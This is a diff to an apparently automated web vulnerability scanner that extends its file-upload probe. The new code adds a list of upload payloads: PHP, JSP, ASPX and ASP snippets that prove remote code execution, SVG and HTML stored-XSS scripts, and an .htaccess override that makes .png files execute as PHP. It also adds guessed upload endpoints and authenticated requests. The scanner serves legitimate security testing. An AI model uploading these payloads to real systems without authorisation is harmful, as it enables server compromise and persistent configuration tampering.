@@ -1,7 +1,8 @@
 import semver from "semver";
-import { AuthSession, CONFIDENCE, FETCH_HEADERS, JsApiEndpoint, PendingFinding } from "../types";
+import { AuthSession, CONFIDENCE, EMPTY_SESSION, FETCH_HEADERS, JsApiEndpoint, PendingFinding } from "../types";
 import { isSpaHtmlFallback } from "../crawler";
-import { authedFetch, safeFetch } from "../session";
+import { authHeaders, authedFetch, safeFetch } from "../session";
+import { browserVerifyXssExecution } from "../verify";
 
 function isSoft404OrSPARedirect(body: string, homepageHtml: string, path = ""): boolean {
   if (!body) return true;
@@ -459,7 +460,90 @@ export async function probeSoftwareCompositionAnalysis(baseUrl: string): Promise
   return findings;
 }
 
-export async function probeFileUploadVulnerabilities(baseUrl: string, html: string): Promise<PendingFinding[]> {
+interface UploadTestPayload {
+  filename: string;
+  mime: string;
+  content: string;
+  stackName: string;
+  execPattern?: RegExp;
+  isXss?: boolean;
+  isConfig?: boolean;
+}
+
+const MULTI_STACK_UPLOAD_PAYLOADS: UploadTestPayload[] = [
+  // 1. PHP Executable (Apache/Nginx + PHP-FPM)
+  {
+    filename: "vulnscan_probe.php",
+    mime: "application/x-php",
+    content: "<?php echo 'VULNSCAN_PHP_RCE_' . php_uname(); ?>",
+    stackName: "PHP",
+    execPattern: /VULNSCAN_PHP_RCE_|Linux|Darwin|Windows NT/i,
+  },
+  // 2. PHP Alternate Extension Bypass (.phtml)
+  {
+    filename: "vulnscan_probe.phtml",
+    mime: "application/x-php",
+    content: "<?php echo 'VULNSCAN_PHTML_RCE_' . php_uname(); ?>",
+    stackName: "PHP (phtml bypass)",
+    execPattern: /VULNSCAN_PHTML_RCE_|Linux|Darwin|Windows NT/i,
+  },
+  // 3. Java / JSP (Tomcat, Spring, WildFly, Jetty)
+  {
+    filename: "vulnscan_probe.jsp",
+    mime: "application/octet-stream",
+    content: '<% out.println("VULNSCAN_JSP_RCE_" + System.getProperty("os.name")); %>',
+    stackName: "Java / JSP",
+    execPattern: /VULNSCAN_JSP_RCE_|Windows|Linux|Solaris|Mac/i,
+  },
+  // 4. ASP.NET / IIS (C# WebForms / Classic .NET)
+  {
+    filename: "vulnscan_probe.aspx",
+    mime: "application/octet-stream",
+    content: '<%@ Page Language="C#" %><% Response.Write("VULNSCAN_ASPX_RCE_" + Environment.OSVersion); %>',
+    stackName: "ASP.NET / IIS",
+    execPattern: /VULNSCAN_ASPX_RCE_|Microsoft Windows/i,
+  },
+  // 5. Classic ASP (IIS)
+  {
+    filename: "vulnscan_probe.asp",
+    mime: "text/asp",
+    content: '<% Response.Write("VULNSCAN_ASP_RCE_" & ScriptEngine) %>',
+    stackName: "Classic ASP",
+    execPattern: /VULNSCAN_ASP_RCE_|VBScript|JScript/i,
+  },
+  // 6. Cross-Stack SVG Stored XSS (Node.js, Python, Ruby, Go, PHP, Java)
+  {
+    filename: "vulnscan_probe.svg",
+    mime: "image/svg+xml",
+    content: '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" xmlns="http://www.w3.org/2000/svg"><script type="text/javascript">alert("VULNSCAN_XSS")</script><text x="20" y="20">VULNSCAN_STORED_SVG</text></svg>',
+    stackName: "Cross-Stack (SVG Stored XSS)",
+    isXss: true,
+  },
+  // 7. Cross-Stack HTML Stored XSS (Node.js, Python, Ruby, Go, PHP, Java)
+  {
+    filename: "vulnscan_probe.html",
+    mime: "text/html",
+    content: '<!DOCTYPE html><html><head><title>VULNSCAN</title></head><body><script>alert("VULNSCAN_XSS")</script><h1>VULNSCAN_STORED_HTML</h1></body></html>',
+    stackName: "Cross-Stack (HTML Stored XSS)",
+    isXss: true,
+  },
+  // 8. Apache .htaccess Override
+  {
+    filename: ".htaccess",
+    mime: "text/plain",
+    content: "AddType application/x-httpd-php .png\nphp_flag engine on",
+    stackName: "Apache Server Configuration (.htaccess)",
+    isConfig: true,
+  },
+];
+
+export async function probeFileUploadVulnerabilities(
+  baseUrl: string,
+  html: string,
+  session: AuthSession = EMPTY_SESSION,
+  log?: (m: string) => void,
+  scanId?: string
+): Promise<PendingFinding[]> {
   const findings: PendingFinding[] = [];
   const uploadForms: Array<{ action: string; fieldName: string }> = [];
 
@@ -479,13 +563,14 @@ export async function probeFileUploadVulnerabilities(baseUrl: string, html: stri
     "/api/upload", "/api/v1/upload", "/api/v2/upload", "/api/uploads", "/upload",
     "/api/file/upload", "/api/files/upload", "/rest/file/upload", "/file/upload",
     "/files/upload", "/upload/file", "/api/images/upload", "/api/media/upload",
+    "/api/avatar", "/api/profile/avatar", "/api/attachment", "/api/documents/upload",
   ];
 
   for (const path of uploadApiPaths) {
     try {
       const url = new URL(path, baseUrl).toString();
       const resp = await safeFetch(url, 5000);
-      if (resp && (resp.status === 200 || resp.status === 405)) {
+      if (resp && (resp.status === 200 || resp.status === 405 || resp.status === 401 || resp.status === 403)) {
         const text = await resp.text().catch(() => "");
         if (!isSpaHtmlFallback(resp, text)) {
           uploadForms.push({ action: url, fieldName: "file" });
@@ -496,109 +581,174 @@ export async function probeFileUploadVulnerabilities(baseUrl: string, html: stri
 
   if (uploadForms.length === 0) return findings;
 
-  for (const { action, fieldName } of uploadForms.slice(0, 3)) {
-    try {
-      const webshellContent = "<?php echo 'VULNSCAN_RCE_' . php_uname(); ?>";
-      const webshellFormData = new FormData();
-      webshellFormData.append(fieldName, new Blob([webshellContent], { type: "application/x-php" }), "vulnscan_probe.php");
+  const testedActions = new Set<string>();
 
-      const webshellResp = await fetch(action, {
-        method: "POST",
-        body: webshellFormData,
-        signal: AbortSignal.timeout(6000),
-        // @ts-ignore
-        next: { revalidate: 0 },
-      }).catch(() => null);
+  for (const { action, fieldName } of uploadForms.slice(0, 4)) {
+    if (testedActions.has(action)) continue;
+    testedActions.add(action);
 
-      if (!webshellResp || !webshellResp.ok) continue;
-      const uploadText = await webshellResp.text().catch(() => "");
-      if (isSpaHtmlFallback(webshellResp, uploadText)) continue;
-
-      // Step 2: Try to discover the uploaded file URL from the response
-      // Common upload APIs return { url, path, filename, location, file } in JSON
-      let uploadedFileUrl: string | null = null;
+    for (const payload of MULTI_STACK_UPLOAD_PAYLOADS) {
       try {
-        const json = JSON.parse(uploadText);
-        const rawPath =
-          json?.url || json?.path || json?.filename || json?.location ||
-          json?.file || json?.data?.url || json?.data?.path ||
-          json?.result?.url || json?.result?.path || null;
-        if (rawPath && typeof rawPath === "string") {
-          uploadedFileUrl = rawPath.startsWith("http")
-            ? rawPath
-            : new URL(rawPath, action).toString();
-        }
-      } catch {
-        // Fall back: scan body for a relative or absolute URL ending in .php
-        const urlMatch = uploadText.match(/["']((?:\/[^"']*)?vulnscan_probe\.php)["']/i);
-        if (urlMatch) {
-          uploadedFileUrl = new URL(urlMatch[1], action).toString();
-        }
-      }
+        const formData = new FormData();
+        formData.append(fieldName, new Blob([payload.content], { type: payload.mime }), payload.filename);
 
-      if (uploadedFileUrl) {
-        // Step 3: Fetch the uploaded file — if PHP executed our probe, it outputs the OS info
-        const execResp = await safeFetch(uploadedFileUrl, 6000);
-        if (execResp && execResp.status === 200) {
-          const execBody = await execResp.text().catch(() => "");
-          const phpExecuted = /VULNSCAN_RCE_|Linux|Darwin|Windows NT/i.test(execBody) &&
-            !/<html|<!doctype/i.test(execBody.slice(0, 200));
+        const uploadHeaders: Record<string, string> = {
+          "User-Agent": FETCH_HEADERS["User-Agent"],
+          ...authHeaders(session),
+        };
 
-          if (phpExecuted) {
-            // Confirmed RCE via PHP execution — CRITICAL
+        const uploadResp = await fetch(action, {
+          method: "POST",
+          headers: uploadHeaders,
+          body: formData,
+          signal: AbortSignal.timeout(7000),
+          // @ts-ignore
+          next: { revalidate: 0 },
+        }).catch(() => null);
+
+        if (!uploadResp || !uploadResp.ok) continue;
+        const uploadText = await uploadResp.text().catch(() => "");
+        if (isSpaHtmlFallback(uploadResp, uploadText)) continue;
+
+        let uploadedFileUrl: string | null = null;
+        try {
+          const json = JSON.parse(uploadText);
+          const rawPath =
+            json?.url || json?.path || json?.filename || json?.location ||
+            json?.file || json?.data?.url || json?.data?.path ||
+            json?.result?.url || json?.result?.path || null;
+          if (rawPath && typeof rawPath === "string") {
+            uploadedFileUrl = rawPath.startsWith("http")
+              ? rawPath
+              : new URL(rawPath, action).toString();
+          }
+        } catch {
+          const safeNameRegex = new RegExp(`["']((?:\\/[^"']*)?${payload.filename.replace(".", "\\.")})["']`, "i");
+          const urlMatch = uploadText.match(safeNameRegex);
+          if (urlMatch) {
+            uploadedFileUrl = new URL(urlMatch[1], action).toString();
+          }
+        }
+
+        if (uploadedFileUrl) {
+          const execResp = await fetch(uploadedFileUrl, {
+            headers: { ...FETCH_HEADERS, ...authHeaders(session) },
+            signal: AbortSignal.timeout(6000),
+            // @ts-ignore
+            next: { revalidate: 0 },
+          }).catch(() => null);
+
+          if (execResp && execResp.status === 200) {
+            const execBody = await execResp.text().catch(() => "");
+            const contentType = (execResp.headers.get("content-type") || "").toLowerCase();
+
+            // Scenario A: Server-Side Remote Code Execution (PHP, JSP, ASPX, ASP)
+            if (payload.execPattern && payload.execPattern.test(execBody) && !/<html|<!doctype/i.test(execBody.slice(0, 200))) {
+              findings.push({
+                type: "file-upload-rce",
+                severity: "CRITICAL",
+                url: uploadedFileUrl,
+                parameter: fieldName,
+                evidence: `Unrestricted File Upload Remote Code Execution (${payload.stackName}): successfully uploaded "${payload.filename}" to ${action}, fetched at ${uploadedFileUrl}, and server-side code executed (output: "${execBody.slice(0, 100)}").`,
+                cvssScore: 9.8,
+                cveId: "CWE-434",
+                confidence: 0.99,
+                isVerified: true,
+                validationSteps: [
+                  `Uploaded ${payload.stackName} file "${payload.filename}" to ${action} (HTTP ${uploadResp.status})`,
+                  `Fetched file at ${uploadedFileUrl} — server-side execution confirmed (${payload.stackName})`,
+                ],
+              });
+              break;
+            }
+
+            // Scenario B: Client-Side Stored XSS via File Upload (SVG or HTML - All Stacks)
+            if (payload.isXss && (execBody.includes("VULNSCAN_STORED_") || execBody.includes("VULNSCAN_XSS"))) {
+              let browserFired = false;
+              if (scanId && log) {
+                browserFired = await browserVerifyXssExecution(uploadedFileUrl, log, scanId);
+              }
+
+              findings.push({
+                type: "file-upload-stored-xss",
+                severity: "HIGH",
+                url: uploadedFileUrl,
+                parameter: fieldName,
+                evidence: `Stored XSS via File Upload (${payload.stackName}): successfully uploaded "${payload.filename}" to ${action}. The file is rendered inline at ${uploadedFileUrl} with content-type "${contentType}", executing arbitrary script in user browsers.`,
+                cvssScore: 8.2,
+                cveId: "CWE-79",
+                confidence: browserFired ? CONFIDENCE.EXEC_VERIFIED : CONFIDENCE.DUAL_VERIFIED,
+                isVerified: true,
+                validationSteps: [
+                  `Uploaded ${payload.filename} with embedded script to ${action}`,
+                  `Retrieved file from ${uploadedFileUrl} with active script content served inline (${contentType})`,
+                  ...(browserFired ? ["Headless browser confirmed script execution (alert fired)"] : []),
+                ],
+              });
+              continue;
+            }
+
+            // Scenario C: Server Configuration File (.htaccess)
+            if (payload.isConfig && execBody.includes("AddType application/x-httpd-php")) {
+              findings.push({
+                type: "file-upload-config-override",
+                severity: "HIGH",
+                url: uploadedFileUrl,
+                parameter: fieldName,
+                evidence: `Dangerous Server Configuration Upload: endpoint ${action} accepted a .htaccess file and stored it at ${uploadedFileUrl}, allowing arbitrary server configuration override.`,
+                cvssScore: 8.5,
+                cveId: "CWE-434",
+                confidence: 0.95,
+                isVerified: true,
+                validationSteps: [
+                  `Uploaded .htaccess override to ${action} — accepted (HTTP ${uploadResp.status})`,
+                  `Verified .htaccess persistence at ${uploadedFileUrl}`,
+                ],
+              });
+              continue;
+            }
+
+            // Scenario D: Executable extension stored and accessible statically
+            if (!payload.isXss && !payload.isConfig) {
+              findings.push({
+                type: "file-upload-stored-accessible",
+                severity: "MEDIUM",
+                url: uploadedFileUrl,
+                parameter: fieldName,
+                evidence: `File Upload Policy Weakness (${payload.stackName}): endpoint ${action} accepted "${payload.filename}" and made it accessible at ${uploadedFileUrl}. While immediate execution was not detected, storing executable extensions can enable RCE or defacement.`,
+                cvssScore: 6.5,
+                cveId: "CWE-434",
+                confidence: 0.80,
+                isVerified: false,
+                validationSteps: [
+                  `Uploaded "${payload.filename}" to ${action} — accepted (HTTP ${uploadResp.status})`,
+                  `Fetched file at ${uploadedFileUrl} — stored and publicly reachable`,
+                ],
+              });
+            }
+          }
+        } else {
+          if (payload.execPattern) {
             findings.push({
-              type: "file-upload-executable",
-              severity: "CRITICAL",
-              url: uploadedFileUrl,
+              type: "file-upload-accepted",
+              severity: "LOW",
+              url: action,
               parameter: fieldName,
-              evidence: `Unrestricted File Upload with confirmed Remote Code Execution: uploaded PHP probe to ${action}, fetched at ${uploadedFileUrl}, and PHP executed (output: "${execBody.slice(0, 100)}").`,
-              cvssScore: 9.8,
+              evidence: `File Upload Policy: endpoint ${action} accepted "${payload.filename}" (${payload.stackName}, HTTP ${uploadResp.status}) without validation rejection. Public storage location could not be determined automatically.`,
+              cvssScore: 3.5,
               cveId: "CWE-434",
-              confidence: 0.99,
-              isVerified: true,
-              validationSteps: [
-                `Uploaded PHP file to ${action} — accepted (HTTP ${webshellResp.status})`,
-                `Fetched uploaded file at ${uploadedFileUrl} — PHP execution confirmed (OS info returned)`,
-              ],
-            });
-          } else {
-            // File is accessible but PHP not executed (likely stored as static asset) — MEDIUM
-            findings.push({
-              type: "file-upload-stored-accessible",
-              severity: "MEDIUM",
-              url: uploadedFileUrl,
-              parameter: fieldName,
-              evidence: `File Upload: endpoint ${action} accepted a PHP file and it is publicly accessible at ${uploadedFileUrl}, however PHP does not appear to have executed. The file may be served as static content — potential for stored XSS or path traversal depending on content.`,
-              cvssScore: 6.5,
-              cveId: "CWE-434",
-              confidence: 0.80,
+              confidence: 0.50,
               isVerified: false,
               validationSteps: [
-                `Uploaded PHP file to ${action} — accepted (HTTP ${webshellResp.status})`,
-                `Fetched uploaded file at ${uploadedFileUrl} — file accessible but PHP not executed`,
+                `Uploaded executable payload "${payload.filename}" to ${action} — accepted with HTTP ${uploadResp.status}`,
               ],
             });
           }
         }
-      } else {
-        // Step 3 fallback: can't determine file path → low-confidence signal only (not CRITICAL)
-        findings.push({
-          type: "file-upload-accepted",
-          severity: "LOW",
-          url: action,
-          parameter: fieldName,
-          evidence: `File Upload: endpoint ${action} accepted a PHP file upload (HTTP ${webshellResp.status}) but the uploaded file URL could not be determined. Manual verification required to confirm if the file is stored or executable.`,
-          cvssScore: 3.1,
-          cveId: "CWE-434",
-          confidence: 0.50,
-          isVerified: false,
-          validationSteps: [
-            `Uploaded PHP file to ${action} — server returned HTTP ${webshellResp.status}`,
-            "Uploaded file URL not determinable from response — manual verification needed",
-          ],
-        });
+      } catch {
+        /* try next payload */
       }
-    } catch { /* next */ }
+    }
   }
 
   return findings;
